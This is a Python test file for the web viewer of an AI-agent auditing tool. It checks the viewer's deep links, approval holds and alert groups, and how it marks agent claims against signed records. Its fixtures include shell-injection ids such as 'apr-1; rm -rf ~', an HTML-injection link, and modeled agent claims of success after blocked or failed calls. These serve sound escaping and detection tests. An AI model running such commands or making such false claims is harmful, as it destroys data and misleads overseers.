"""tracekit view's page (tracekit/ui/terminal.html): its themes, links, panels and views, run in Node where they are code.

    python3 -m pytest tests/test_view_ui.py -v
"""
import html
import json
import os
import re
import shutil
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from tracekit import observe, view  # noqa: E402
from test_view import page_js, v2rec  # noqa: E402

PAGE = observe.read_text(observe.UI)
COLOUR = re.compile(r"#[0-9a-fA-F]{3,8}\b|rgba?\(")


def needs_node(test):
    if not shutil.which("node"):
        test.skipTest("needs node to run the page's code")


class Theme(unittest.TestCase):
    def test_every_colour_is_a_token_and_light_redefines_each_one(self):
        """A colour written outside the tokens stays dark in the light theme (the tape's row lines, the lanes)."""
        css = PAGE[PAGE.index("<style>"):PAGE.index("</style>")]
        blocks = re.findall(r"(:root[^{]*)\{([^}]*)\}", css)
        tokens = {sel.strip(): dict(re.findall(r"(--[\w-]+):\s*([^;]+);", body)) for sel, body in blocks}
        dark, auto, light = (tokens[k] for k in (":root", ':root:not([data-theme="dark"])', ':root[data-theme="light"]'))
        self.assertEqual(auto, light)
        self.assertEqual(set(light), set(dark) - {"--mono"})
        rest = re.sub(r":root[^{]*\{[^}]*\}", "", css)
        self.assertEqual(COLOUR.findall(rest), [])
        self.assertEqual(re.findall(r"""["'`]#[0-9a-fA-F]{3,8}\b""", PAGE[PAGE.index("<script"):]), [])
        self.assertIn("color:var(--ink)", PAGE)   # the help overlay's title, the one style attribute with a colour

    def test_a_picked_theme_is_kept_and_applies_where_storage_is_refused(self):
        needs_node(self)
        out = json.loads(page_js(["THEMES", "setTheme"], """
            const el = {}, $ = id => el[id] ??= {}, document = { documentElement: { dataset: {} } }, schedule = () => {};
            let kept = null; const localStorage = { setItem(k, v) { kept = [k, v]; } }, seen = [];
            const look = () => seen.push([document.documentElement.dataset.theme ?? null, el.theme.textContent, kept]);
            setTheme("light"); look();
            localStorage.setItem = () => { throw new Error("SecurityError"); };   // a private window
            setTheme("dark"); look();
            setTheme("<b>"); look();
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, [["light", "THEME LIGHT", ["tracekit-theme", "light"]],
                               ["dark", "THEME DARK", ["tracekit-theme", "light"]],
                               [None, "THEME AUTO", ["tracekit-theme", "light"]]])


class DeepLinks(unittest.TestCase):
    def test_a_link_opens_its_run_view_and_record_and_back_steps_through_what_was_opened(self):
        """The URL said nothing of what was open: a run could be linked (#run=) but not its view or record, and Back
        left the page."""
        needs_node(self)
        out = json.loads(page_js(["PAGES", "RVIEWS", "show", "linkOf", "syncLink", "followLink"], """
            let scope = null, PAGE = "desk", RV = "calls", CALLSLOG = false, selected = null, R = null, linked = false, following = false, wvKey = "x";
            const V2 = true, RUNS = new Map([["r 1&x", {}]]), lseq = r => r.tk_seq, schedule = () => {}, seen = [], goLive = () => {};
            const location = { hash: "#seq=7&view=graph&run=r+1%26x", pathname: "/" };
            const write = how => (_, __, h) => { seen.push([how, h]); location.hash = h.startsWith("#") ? h : ""; };
            const history = { pushState: write("push"), replaceState: write("replace") };
            const setScope = id => { scope = id; selected = null; };
            const openSeq = n => { selected = { tk_seq: n - 1 }; };   // record 7 has no row: the one before it opens
            syncLink();                                  // before the link is read the URL keeps it
            followLink(); syncLink();                    // followed: its record opened as the row before it
            seen.push([scope, PAGE, RV]);
            selected = { pre: { tk_seq: 9 } }; syncLink();   // a click: a new entry, so Back returns to seq 6
            R = [{}]; selected = { tk_seq: 10 }; syncLink(); R = null;   // a replay step replaces it
            location.hash = "#run=nope&view=%3Cscript%3E"; followLink(); syncLink();   // an unknown run and view
            seen.push([scope, PAGE, RV]);
            PAGE = "desk"; selected = null; syncLink();   // DESK with a run: its own page name
            scope = null; syncLink();
            // old links: the why log's TIMELINE is CALLS with its events, PERMISSIONS a page, a run alone its page
            for (const h of ["#view=timeline", "#view=permissions", "#run=r+1%26x", "#page=runs", "#view=waterfall&run=r+1%26x", "#page=map"]) {
              location.hash = h; followLink(); seen.push([h, PAGE, RV, CALLSLOG]); }
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, [["replace", "#run=r+1%26x&view=graph&seq=6"], ["r 1&x", "run", "graph"],
                               ["push", "#run=r+1%26x&view=graph&seq=9"], ["replace", "#run=r+1%26x&view=graph&seq=10"],
                               ["replace", "#run=r+1%26x&view=calls"], ["r 1&x", "run", "calls"],
                               ["push", "#page=desk&run=r+1%26x"], ["push", "/"],
                               ["#view=timeline", "run", "calls", True], ["#view=permissions", "permissions", "calls", True],
                               ["#run=r+1%26x", "run", "calls", False], ["#page=runs", "runs", "calls", False],
                               ["#view=waterfall&run=r+1%26x", "run", "waterfall", False],
                               ["#page=map", "horizon", "waterfall", False]])

    def test_back_and_forward_follow_the_link_and_the_seq_command_shares_its_record_lookup(self):
        self.assertIn('window.addEventListener("popstate", () => linked && followLink());', PAGE)
        self.assertEqual(PAGE.count("S.recs.reduce((b, r) => lseq(r) != null && lseq(r) <= n"), 1)



class Panels(unittest.TestCase):
    def test_a_run_started_by_another_is_listed_under_it(self):
        recs = [v2rec(1, "run.registered", {"agent": {"name": "coder"}, "parent_run": "orch", "session": "orch"})]
        self.assertEqual(view.review(recs, mock.Mock(integrity="VERIFIED", assurance="dev"), "verified")["parent"], "orch")
        self.assertNotIn("parent", view.review(recs[:0], mock.Mock(integrity="VERIFIED", assurance="dev"), "verified"))

    def test_the_tree_puts_each_after_its_parent_and_keeps_orphans_and_loops(self):
        """Panel 1 listed runs by time and sub-agents one level under main: who started whom was not shown."""
        needs_node(self)
        out = page_js(["treeOrder"], """
            const items = [["a", null], ["c", "b"], ["b", "a"], ["d", "gone"], ["x", "y"], ["y", "x"], ["s", "s"]];
            process.stdout.write(treeOrder(items, i => i[0], i => i[1]).map(([i, d]) => i[0] + d).join(" "));""")
        self.assertEqual(out, "a0 b1 c2 d0 s0 x0 y1")

    def test_each_active_filter_is_a_chip_that_removes_it(self):
        needs_node(self)
        out = json.loads(page_js(["KINDS", "filterChips"], """
            const V2 = true, RUNS = new Map([["d91c70b32fa1", { agent: "coder" }]]);
            let scope = null, F = { agent: null, tool: null, file: null, flag: false, find: null, kind: null };
            const seen = [filterChips()];
            scope = "d91c70b32fa1"; seen.push(filterChips());
            F = { agent: "api", tool: "Bash", file: null, flag: true, find: "rm", kind: "apr" }; seen.push(filterChips());
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, [[], [["run", "", "RUN coder·d91c70b3"]],
                               [["run", "", "RUN coder·d91c70b3"], ["clear", "agent", "AGT api"],
                                ["clear", "tool", "TOOL Bash"], ["clear", "flag", "FLAGGED"], ["clear", "find", "FIND rm"],
                                ["clear", "kind", "TAPE APPROVALS"], ["clear", "all", "CLEAR ALL"]]])
        self.assertIn('if (t.dataset.clear === "all") { runCommand("CLR"); return setScope(null); }', PAGE)



def text(html):
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", html)).strip()


class WhyThisDecision(unittest.TestCase):
    def detail(self, call):
        return json.loads(page_js(["esc", "short", "cp", "shq", "word", "ANSWER", "lastAnswer", "ended", "callState", "whyDecision"], f"""
            const S = {{ sessions: new Map() }}, label = () => "coder·5e67", DESK = () => true;
            const a = {json.dumps(call)}; a.agent = {{ session: "r1" }}; a.approvals ??= []; a.flags ??= [];
            process.stdout.write(JSON.stringify(whyDecision(a)));"""))

    def test_a_held_call_shows_each_section_read_its_rule_and_the_commands_that_answer_it(self):
        """DETAIL listed a call's rules, not the walk that decided it: what was read, what matched, who may answer."""
        needs_node(self)
        html = self.detail({"tool": "send_email", "v2": {
            "decision": "ask", "cls": "email", "read": {"deny": 7, "ask": 6, "flag": 3}, "secs": {"TK-P001": "ask"},
            "rules": [{"id": "TK-P001", "reason": "email outside the company", "remedy": "Send it from a person."}]},
            "approvals": [{"v2": {"approval": "requested", "approval_id": "apr<1>",
                                  "agents": {"eligible": False, "reason": "the rule has no agent bounds"}}}]})
        self.assertEqual(text(html), (
            "WHY THIS DECISION 1 CALL send_email from coder·5e67 · class email (the policy's map of this tool) "
            "2 DENY RULES read 7 · none matched 3 ASK RULES read 6 · matched TK-P001 email outside the company what "
            "to do: Send it from a person. 4 FLAG RULES read 3 · none matched 5 DECISION ASK the first section with a "
            "match decides: deny, then ask, then flag; none, allow 6 OUTCOME WAITING 7 WHO ANSWERS a person the "
            "signer takes as an approver, on the approvals page , or in a terminal with the signer's approvals command no "
            "agent approver may answer it: the rule has no agent bounds tracekit approvals approve &#39;apr&lt;1&gt;&#39; COPY "
            "tracekit approvals reject &#39;apr&lt;1&gt;&#39; COPY"))   # the id one quoted shell word
        self.assertIn('<b class="ask">3</b>', html)
        self.assertIn('<a href="/approvals">approvals page</a>', html)

    def test_a_rule_that_matched_under_another_class_is_said_not_counted(self):
        """The record names no class: a shell rule on an http tool matched under a class hint the signer also checked."""
        tr, h = view.Translator(view.policy_reasons()), None
        h = next(k for k, rules in tr.reasons.items() if "TK-D003" in rules and "TK-N001" in rules)
        own, other = (tr.feed(v2rec(1, "policy.decision", {"tool_use_id": "c1", "tool": "http_get", "decision": "deny",
                                                           "rule_ids": [i], "policy_hash": h}))[0]["v2"]
                      for i in ("TK-N001", "TK-D003"))
        self.assertEqual((own["cls"], own["secs"], "other" in own), ("http", {"TK-N001": "deny"}, False))
        self.assertEqual((other["secs"], other["other"]), ({"TK-D003": "deny"}, True))

    def test_no_rule_is_said_read_or_matched_when_the_engine_never_ran_or_ran_out_of_time(self):
        """A decision denied for arguments the signer could not read (TK-ARGS-INVALID) got read counts, and one whose
        regex engine ran out of time listed the rule it was on as matched."""
        tr = view.Translator(view.policy_reasons())
        h = next(k for k, rules in tr.reasons.items() if "TK-D003" in rules)
        bad, slow = (tr.feed(v2rec(1, "policy.decision", {"tool_use_id": "c1", "tool": "Bash", "decision": "deny", "policy_hash": h,
                                                        **extra}))[0]["v2"] for extra in (
            {"rule_ids": ["TK-ARGS-INVALID"]},
            {"rule_ids": ["TK-D003"], "nondeterministic": True, "reasons": ["nondeterministic: the fallback regex engine ran out"]}))
        self.assertEqual([k for k in ("cls", "read", "secs", "other") if k in bad or k in slow], [])
        self.assertEqual((slow["nondeterministic"], slow["reasons"]), (True, ["nondeterministic: the fallback regex engine ran out"]))
        needs_node(self)
        html = text(self.detail({"tool": "Bash", "pre": {}, "denied": True, "v2": {
            "decision": "deny", "nondeterministic": True, "reasons": slow["reasons"], "rules": [{"id": "TK-D003", "reason": "force push"}]}}))
        # a rule matched before time ran out stays among the rule ids: the signer's own words, not "none matched"
        self.assertIn("2 ENGINE nondeterministic: the fallback regex engine ran out · the rule it was matching when time ran "
                      "out is among these, without having matched: TK-D003", html)
        self.assertNotIn("none of them", html)
        html = text(self.detail({"tool": "Bash", "pre": {}, "denied": True, "v2": {
            "decision": "deny", "rules": [{"id": "TK-ARGS-INVALID", "reason": "arguments the signer could not read, so it refused the call"}]}}))
        self.assertIn("2 ENGINE no rule was read: TK-ARGS-INVALID arguments the signer could not read, so it refused the call", html)
        self.assertNotIn("POLICY", html)

    def test_a_call_of_a_policy_the_viewer_lacks_names_only_what_matched(self):
        needs_node(self)
        html = text(self.detail({"tool": "Bash", "pre": {}, "denied": True, "v2": {
            "decision": "deny", "policy_hash": "sha256:0123456789abcdef", "rules": [{"id": "TK-D003", "reason": ""}]}}))
        self.assertIn("2 POLICY sha256:0123456789ab…: not a policy this viewer has, so only the rules that matched are "
                      "known", html)
        self.assertIn("3 MATCHED TK-D003 (no reason in this policy) 4 DECISION DENY", html)
        self.assertIn("5 OUTCOME BLOCKED 6 WHO ANSWERS nobody: a denied call is never held", html)
        self.assertNotIn("tracekit approvals", html)
        html = text(self.detail({"tool": "Agent", "v2": {"decision": "ask", "rules": []}}))
        self.assertIn("nobody yet: the agent has not requested an approval for this call", html)


class SaidVsDid(unittest.TestCase):
    """Rule 2, words are not proof: what the model said of an outcome sat beside nothing; every "tests pass" was re-run
    by hand to check it."""
    NAMES = ["esc", "ANSWER", "lastAnswer", "ended", "callState", "MARKS", "TEXT_RULES", "didFact", "reportsOn",
             "saidMark"]
    RUN = """
        const S = { asked: new Map(), actList: [], reasoning: [], cited: new Map(), sessions: new Map([["r1", {}]]), tape: [] };
        const rec = { session_id: "r1" }, says = (x, seq, text, claims = [text]) => S.reasoning.push({ x, seq, rec, kind: "says", text, claims });
        // a call asked for by message x (its record's run_seq at), decided at seq
        const call = (id, x, at, seq, more = {}) => { const c = { id: "r1|" + id, tool: "Bash", agent: { session: "r1" }, approvals: [], flags: [], post: null,
          pre: { session_id: "r1", tool_use_id: id, tk_seq: seq, v2: { run_seq: seq } }, v2: { decision: "allow", run_seq: seq }, ...more };
          S.actList.push(c); S.asked.set(c.id, { x, seq: at }); return c; };
        const post = (seq, more = {}) => ({ session_id: "r1", tk_seq: seq, tk_source: "sdk", v2: { run_seq: seq }, ...more });
        says("m0", 0, "All done.");                                                // nothing ran before it
        call("c1", "m0", 0, 2, { post: post(3, { tk_source: "gateway", tk_tier: "T2", v2: { run_seq: 3, via: "mtls:executor" } }) });
        says("m2", 4, "All 12 tests pass.");                                       // the executor wrote the result: T2
        call("c2", "m2", 4, 5, { post: post(6) });
        says("m3", 7, "Done.");                                                    // the agent's own client wrote it
        const blocked = call("c3", "m3", 7, 8, { denied: true, v2: { decision: "deny", run_seq: 8 } });
        says("m4", 9, "Pushed the fix to main.");                                  // a blocked call said as done
        call("c4", "m4", 9, 10, { v2: { decision: "ask", run_seq: 10 }, approvals: [{ tk_seq: 11, v2: { approval: "reject" } }] });
        says("m5", 12, "The email is sent and done.", ["The email is sent and done."]);   // held, then rejected
        call("c5", "m5", 12, 13);
        says("m6", 14, "Fixed.");                                                  // no result recorded
        call("c6", "m6", 14, 15, { post: post(16, { tk_tier: "T2", tk_source: "gateway" }) });
        says("m7", 17, "Tests pass.");                                             // a TK-X205 finding cites it
        S.cited.set("r1|17", [{ title: "FINDING TK-X205 · Success claimed after a failure", v2: { finding: { rule: "TK-X205" } } }]);
        says("m8", 18, "I did not push anything.", []);                            // a denial a TK-X111 finding cites
        S.cited.set("r1|18", [{ title: "FINDING TK-X111 · Push denied, but it ran", v2: { finding: { rule: "TK-X111" } } }]);
    """

    def test_each_statement_of_an_outcome_is_marked_by_the_signed_record_of_the_calls_it_reports_on(self):
        needs_node(self)
        out = json.loads(page_js(self.NAMES, self.RUN + """
            process.stdout.write(JSON.stringify(S.reasoning.map(r => { const s = saidMark(r);
              return [r.text, MARKS[s.m], s.facts.map(([c, m, w, rec]) => `${c.pre.tool_use_id} ${m} ${w} · seq ${rec.tk_seq}`), s.f?.title || null]; })));"""))
        self.assertEqual(out, [
            ["All done.", "AGENT'S WORD", [], None],
            ["All 12 tests pass.", "BACKED",
             ["c1 b ran: mtls:executor wrote its result (T2), not the agent · seq 3"], None],
            ["Done.", "AGENT'S WORD",
             ["c2 w ran by the agent's own report: its client wrote the result (sdk) · seq 6"], None],
            ["Pushed the fix to main.", "CONTRADICTED", ["c3 x blocked by the signer: it never ran · seq 8"], None],
            ["The email is sent and done.", "CONTRADICTED", ["c4 x held, rejected: it has not run · seq 11"], None],
            ["Fixed.", "AGENT'S WORD", ["c5 w no result recorded · seq 13"], None],
            ["Tests pass.", "CONTRADICTED",
             ["c6 b ran: a gateway or tool executor wrote its result (T2), not the agent · seq 16"],
             "FINDING TK-X205 · Success claimed after a failure"],
            ["I did not push anything.", "CONTRADICTED",   # the latest calls before it: m7 asked for none
             ["c6 b ran: a gateway or tool executor wrote its result (T2), not the agent · seq 16"],
             "FINDING TK-X111 · Push denied, but it ran"]])

    def test_the_inspector_shows_what_was_said_before_and_after_a_call_each_outcome_marked_and_linked(self):
        needs_node(self)
        html = json.loads(page_js(self.NAMES + ["markHtml", "saidBefore", "sayLabel", "saidVsDid"], self.RUN + """
            S.reasoning.push({ x: "m3", seq: 7, rec, kind: "think", text: "Push it." });   // thinking states nothing
            const denial = S.reasoning.find(r => r.x === "m8");
            process.stdout.write(JSON.stringify([saidVsDid(blocked), saidVsDid(S.actList[5]), saidVsDid({ ...blocked, id: "r1|c9" }),
              markHtml(denial), markHtml({ ...denial, kind: "think" }), markHtml(S.reasoning[1]), markHtml({ ...S.reasoning[1], claims: [] })]));"""))
        self.assertEqual(text(html[0]), (
            "SAID VS DID · SELF-REPORTED, NOT PROOF, BESIDE THE SIGNED RECORD "
            "BEFORE in the message that asked for this call "
            "said Done. signed before this call AGENT&#39;S WORD states “Done.” "
            "Bash · seq 6 ran by the agent&#39;s own report: its client wrote the result (sdk) "
            "thinking Push it. signed before this call "
            "AFTER in the agent&#39;s next message "
            "said Pushed the fix to main. after this call CONTRADICTED states “Pushed the fix to main.” "
            "Bash · seq 8 blocked by the signer: it never ran"))
        self.assertIn('data-tkseq="8" title="c3">', html[0])
        self.assertIn('<span class="mark x">CONTRADICTED</span>', html[0])
        self.assertIn("AFTER in the agent&#39;s next message said Tests pass.", text(html[1]))
        self.assertIn('data-i="-1">FINDING TK-X205', html[1])   # the finding opens its row (not in this fixture's tape)
        self.assertIn("BEFORE no model message recorded for this call", text(html[2]))
        # a denial states no outcome but a TK-X111 finding cites it; thinking and a statement of none are not marked
        self.assertTrue(text(html[3]).startswith("CONTRADICTED FINDING TK-X111 · Push denied, but it ran"))
        self.assertIn("BACKED</span> <span class=\"dim\">states “All 12 tests pass.”", html[5])
        self.assertEqual(html[4] + html[6], "")

    def test_the_inspector_reads_why_then_said_vs_did_then_whose_words_then_the_arguments(self):
        """v7's inspector, top to bottom: WHY THIS DECISION, SAID VS DID, WHOSE WORDS, ARGUMENTS, RESULT, RECORD."""
        start = PAGE.index("    function detailV2(sel) {")
        body = PAGE[start:PAGE.index("\n    }\n", start)]
        order = [body.index(m) for m in ("+ whyDecision(a) + saidVsDid(a) + whoseWords(a);",
                                         '<div class="sec">ARGUMENTS</div>', '<div class="sec">RESULT</div>',
                                         "evidence(a.pre)")]
        self.assertEqual(order, sorted(order))


class WhoseWords(unittest.TestCase):
    """Rule 3: a held or blocked call showed no source of the instruction behind it; words nobody typed became rules."""

    def words(self, call):
        return json.loads(page_js(["esc", "tuid", "PSTATE", "WHOSE", "wordsOf", "whoseWords"], f"""
            const S = {{ recs: [], actions: new Map([["r1|c0", {{ tool: "WebFetch" }}]]) }};
            const rec = (seq, tk_seq, more) => S.recs.push({{ session_id: "r1", tk_seq, ...more, v2: {{ run_seq: seq, ...more.v2 }} }});
            rec(1, 10, {{ event: "tk_note", v2: {{ type: "input.observed", source: "task", trust: "trusted" }} }});
            rec(2, 11, {{ event: "tk_note", v2: {{ type: "input.observed", source: "msg:planner->executor run:p1", trust: "untrusted" }} }});
            rec(3, 12, {{ event: "tk_note", v2: {{ type: "input.observed", source: "web:shipping_faq", trust: "untrusted" }} }});
            rec(4, 13, {{ event: "PostToolUse", tool_use_id: "c0", v2: {{ type: "tool.result" }} }});
            rec(5, 14, {{ event: "tk_alert", title: "CONSTRAINT · don't push", v2: {{ type: "constraint.added", constraint: "no_push" }} }});
            rec(6, 15, {{ event: "UserPromptSubmit", v2: {{ type: "model.exchange" }} }});
            rec(10, 16, {{ event: "tk_note", v2: {{ type: "input.observed", source: "later", trust: "trusted" }} }});   // after the call
            const a = {json.dumps(call)};
            process.stdout.write(JSON.stringify(whoseWords(a)));"""))

    def test_a_held_call_names_the_source_of_each_argument_its_rule_and_the_runs_inputs_each_linked(self):
        needs_node(self)
        html = self.words({"pre": {"session_id": "r1"}, "v2": {
            "decision": "ask", "run_seq": 9, "rules": [{"id": "TK-CONSTRAINT"}], "provenance_state": "complete",
            "provenance": [{"field": "to", "kind": "email", "source": {"run_seq": 2}},
                           {"field": "body", "kind": "string", "source": {"run_seq": 2}},
                           {"field": "url", "kind": "url", "source": {"run_seq": 4, "tool": "WebFetch",
                                                                       "tool_call_id": "c0"}},
                           {"field": "path", "kind": "path", "source": {"run_seq": 99, "tool": "Read"}}]}})
        self.assertEqual(text(html), (
            "WHOSE WORDS · WHERE THE INSTRUCTION BEHIND IT CAME FROM "
            "to, body RELAYED a message from agent planner to executor (untrusted) · seq 11 "
            "url TOOL/WEB the result of WebFetch c0 · seq 13 "
            "path TOOL/WEB record run_seq 99, the result of Read: not in this view "
            "TK-CONSTRAINT TYPED CONSTRAINT · don&#39;t push: from the person&#39;s request, as its client reported it "
            "· seq 14 "
            "run input TYPED task: the person&#39;s request or task, by its client&#39;s word (trusted) · seq 10 "
            "run input TOOL/WEB web:shipping_faq: content the run read (untrusted) · seq 12 "
            "run input TYPED the person&#39;s prompt · seq 15"))
        for seq in (10, 11, 12, 13, 14, 15):
            self.assertIn(f'data-tkseq="{seq}"', html)
        self.assertIn('<span class="ww relayed">RELAYED</span>', html)

    def test_where_the_records_dont_say_it_says_so(self):
        needs_node(self)
        blocked = text(self.words({"pre": {"session_id": "r2"}, "v2": {"decision": "deny", "run_seq": 3, "rules": []}}))
        self.assertIn("arguments no value came only from untrusted content, by the signer&#39;s provenance index: they "
                      "are the person&#39;s or the model&#39;s own words, and the records don&#39;t say which", blocked)
        self.assertIn("run input none recorded before it: no task, prompt or message was observed, so the records "
                      "don&#39;t say whose words asked for this call", blocked)
        lost = self.words({"pre": {"session_id": "r1"}, "v2": {"decision": "flag", "run_seq": 9,
                                                              "provenance_state": "unavailable"}})
        self.assertIn('<dd class="s-flag">unavailable (signer restarted', lost)
        self.assertEqual(self.words({"pre": {"session_id": "r1"}, "v2": {"decision": "allow", "run_seq": 9}}), "")



def hold(seq, call, run="r1", **v2):
    return {"event": "PreToolUse", "session_id": run, "tk_seq": seq, "tool_use_id": call, "tool_name": "send_email",
            "agent": "billing", "v2": {"decision": "ask", **v2}}


def answer(seq, call, how, run="r1", **v2):
    return {"event": "tk_alert", "session_id": run, "tk_seq": seq, "v2": {"tool_use_id": call, "approval": how, **v2}}


class WaitingForYou(unittest.TestCase):
    def test_every_runs_unanswered_holds_count_and_each_opens_its_record(self):
        """The page showed a hold only inside its own run: nothing said a person was needed somewhere else."""
        needs_node(self)
        recs = [hold(1, "c1"), answer(2, "c1", "requested", approval_id="apr-1"), hold(3, "c2"),
                answer(4, "c2", "requested"), answer(5, "c2", "approve"), answer(6, "c2", "consumed"),
                hold(7, "c3", run="r2"), {"event": "SessionEnd", "session_id": "r2", "tk_seq": 8},
                hold(9, "c4"), answer(10, "c4", "escalated"), hold(11, "c5", run="r 3&x"),
                {**hold(12, "c6"), "v2": {"decision": "flag"}}, answer(13, "c7", "expired")]
        out = json.loads(page_js(["waiting", "renderWaiting"], f"""
            const ALL = {json.dumps(recs)}, el = {{}}, $ = id => el[id] ??= {{}};
            let desk = false, waitKey = [], waitList = []; const DESK = () => desk;
            const seen = [waiting().map(w => [w.rec.tool_use_id, w.req?.v2.approval_id ?? null, w.open])];
            renderWaiting(); seen.push([el.waiting.hidden, el.waiting.textContent, el.waiting.title]);
            desk = true; renderWaiting(); seen.push(el.waiting.title);
            ALL.push({json.dumps(answer(14, "c1", "reject"))}); seen.push(waiting().map(w => w.rec.tool_use_id));
            process.stdout.write(JSON.stringify(seen));"""))
        self.assertEqual(out, [[["c1", "apr-1", ["r1", 1]], ["c4", None, ["r1", 9]], ["c5", None, ["r 3&x", 11]]],
                               [False, "WAITING FOR YOU 3", "open the oldest: its detail has the command that answers it"],
                               "answer them on the approvals page", ["c4", "c5"]])
        # no link carries data: a hold opens through the page's state (checklist item 3)
        self.assertIn("if (DESK()) DESK().click(); else if (w) openRec(...w.open);", PAGE)

    def test_a_new_hold_or_high_alert_toasts_as_text_and_the_snapshot_does_not(self):
        needs_node(self)
        out = json.loads(page_js(["vis", "toastOf"], f"""
            const made = [], box = {{ children: [], prepend(t) {{ this.children.unshift(t); }} }};
            Object.defineProperty(box, "lastChild", {{ get() {{ return {{ remove: () => box.children.pop() }}; }} }});
            const document = {{ createElement: tag => {{ const e = {{ tag, kids: [], dataset: {{}}, append(...k) {{ this.kids.push(...k); }},
                                                               remove() {{}} }}; made.push(e); return e; }} }};
            const $ = () => box, DESK = () => false, setTimeout = () => {{}};
            let toasting = false;
            toastOf({json.dumps(hold(1, "c1"))});   // the snapshot: no toast
            toasting = true;
            toastOf({json.dumps(hold(2, "c2"))});
            toastOf({{ event: "tk_alert", severity: "high", title: "rm\u202e<b>", text: "x", agent: "a", session_id: "r", tk_seq: 3 }});
            toastOf({{ event: "tk_alert", severity: "med", title: "quiet", session_id: "r", tk_seq: 4 }});
            for (let i = 0; i < 3; i++) toastOf({json.dumps(hold(5, "c5"))});
            process.stdout.write(JSON.stringify([box.children.length, made.filter(e => e.tag === "b").map(e => e.textContent),
                                                 made.filter(e => e.dataset.orun).map(e => [e.dataset.orun, e.dataset.oseq])]));"""))
        self.assertEqual(out[0], 3)
        self.assertEqual(out[1][:2], ["HELD · send_email waits for a person", "HIGH · rm\\u202e<b>"])
        self.assertEqual(out[2][:2], [["r1", 2], ["r", 3]])
        self.assertIn("toasting = false; snap.records.forEach(accept); toasting = true;", PAGE)



class NeedsYou(unittest.TestCase):
    def needs(self, recs, runs, stopped=""):
        return json.loads(page_js(["j", "plural", "failLines", "shq", "word", "waiting", "needsYou"], f"""
            const ALL = {json.dumps(recs)}, RUNS = new Map({json.dumps(runs)}.map(r => [r.id, r])), STOPPED = {json.dumps(stopped)};
            let waitKey = [], waitList = [];
            process.stdout.write(JSON.stringify(needsYou()));"""))

    def test_an_id_in_a_command_to_copy_is_one_shell_word(self):
        """The approve, reject and resume commands put a record's ids in as they came; runCmds quoted its."""
        needs_node(self)
        held = {**hold(1, "c1"), "v2": {"decision": "ask", "rules": []}}
        out = self.needs([held, answer(2, "c1", "requested", approval_id="apr-1; rm -rf ~")], [
            {"id": "r 1$(x)", "verdict": "verified", "state": "open", "incidents": [
                {"incident_id": "i", "trigger": "rule", "rule_ids": [], "state": "held"}]}])
        self.assertEqual([c for n in out for c in n["cmds"]], [
            "tracekit approvals approve 'apr-1; rm -rf ~'", "tracekit approvals reject 'apr-1; rm -rf ~'",
            "tracekit signer incidents resume -- 'r 1$(x)'"])   # after --, an id is never read as an option
        self.assertEqual(re.findall(r"tracekit (?:approvals \$\{d\}|signer incidents resume(?: --)?) \$\{(?!word\()", PAGE), [])

    def test_what_needs_a_person_comes_first_with_its_command_and_record(self):
        """A person asked "do I need to do anything?" and the answer was spread over runs, alerts and pages."""
        needs_node(self)
        held = {**hold(1, "c1"), "tool_input": {"to": "x@outside.example"},
                "v2": {"decision": "ask", "rules": [{"id": "TK-P001", "reason": "an email outside the company"}]}}
        out = self.needs([held, answer(2, "c1", "requested", approval_id="apr-1"), hold(3, "c2")], [
            {"id": "r1", "agent": "billing", "verdict": "verified", "state": "open", "incidents": [
                {"incident_id": "inc-1", "trigger": "rule", "rule_ids": ["TK-D002"], "state": "held"},
                {"incident_id": "inc-0", "trigger": "rule", "rule_ids": [], "state": "resumed"}]},
            {"id": "r2xxxxxxxx", "agent": "coder", "verdict": "failed", "state": "final",
             "report": "[PASS] chain\n[FAIL] signatures\n  seq 4: bad signature"}], stopped="verification stopped")
        self.assertEqual([(n["kind"], n["open"]) for n in out], [
            ("HOLD", ["r1", 1]), ("HOLD", ["r1", 3]), ("CONTAINED", ["r1", ""]), ("FAILED", ["r2xxxxxxxx", ""]),
            ("STOPPED", None)])
        self.assertEqual(out[0]["what"], "send_email · billing waits for a person: TK-P001 an email outside the company")
        self.assertEqual(out[0]["detail"], 'binds { "to": "x@outside.example" }')
        self.assertEqual(out[0]["cmds"], ["tracekit approvals approve apr-1", "tracekit approvals reject apr-1"])
        self.assertEqual((out[1]["detail"], out[1]["cmds"]),
                         ("arguments kept as a commitment only · no approval requested yet", []))
        self.assertEqual(out[2]["what"], "billing · run held by incident inc-1")
        self.assertEqual(out[3]["detail"], "[FAIL] signatures")

    def test_nothing_needed_reads_all_clear_with_the_agents_working(self):
        needs_node(self)
        self.assertEqual(self.needs([], [{"id": "r1", "verdict": "verified", "state": "open"}]), [])
        self.assertIn('`ALL CLEAR · ${esc(plural(working, "agent"))} working · nothing needs you`', PAGE)



class AlertGroups(unittest.TestCase):
    def test_repeats_of_one_kind_are_one_ranked_group_and_every_alert_stays_in_it(self):
        """13,040 alert rows, mostly one capture-gap alert whose text differed each time: ALERTS read as a flood."""
        needs_node(self)
        out = json.loads(page_js(["srcOf", "SEV_RANK", "alertGroups"], """
            const rec = (run, seq) => ({ rec: { session_id: run, tk_seq: seq } });
            const alerts = [];
            const add = (sev, key, run, text) => alerts.push({ sev, key, text, ref: rec(run, alerts.length), i: alerts.length });
            for (let i = 0; i < 5; i++) add("med", "GAP · signer_unavailable", i < 3 ? "r1" : "r2", `missed ${i}`);
            add("high", "BLOCKED · TK-D003", "r1", "BLOCKED Bash: git push --force");
            add("info", "SIGNER EPOCH", "r3", "1 key");
            add("med", "FLAGGED · TK-F001", "r1", "FLAGGED · Bash");
            process.stdout.write(JSON.stringify(alertGroups(alerts).map(g => [g.key, g.all.length, g.runs, g.al.text])));"""))
        self.assertEqual(out, [["BLOCKED · TK-D003", 1, 1, "BLOCKED Bash: git push --force"],
                               ["FLAGGED · TK-F001", 1, 1, "FLAGGED · Bash"],
                               ["GAP · signer_unavailable", 5, 2, "missed 4"], ["SIGNER EPOCH", 1, 1, "1 key"]])
        self.assertIn("g.all.slice(-GRP_PAGE * (OPENGRP.get(g.key)))", PAGE)   # an open group lists its alerts, paged

    def test_each_alert_is_keyed_by_its_rule_or_kind_not_its_changing_text(self):
        for key in ('"BLOCKED · " + (act.reasons.join(" ") || act.tool)', '"GAP · " + v.kind',
                    '"FINDING " + v.finding.rule', 'String(r.title || "ALERT").replace(/\\b\\d+\\b/g, "n")'):
            self.assertIn(key, PAGE)



class Permissions(unittest.TestCase):
